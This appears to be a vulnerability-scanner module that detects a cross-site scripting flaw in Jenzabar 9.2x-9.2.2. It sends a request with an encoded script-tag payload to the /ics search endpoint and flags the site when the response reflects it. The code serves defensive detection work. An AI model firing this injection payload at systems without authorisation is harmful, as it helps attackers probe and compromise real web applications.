...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jenzabar 9.2x-9.2.2 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'packetstorm', 'jenzabar', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/ics?tool=search&query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Jenzabar 9.2x-9.2.2 - Cross-Site Scripting detected",
                path='/ics?tool=search&query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False
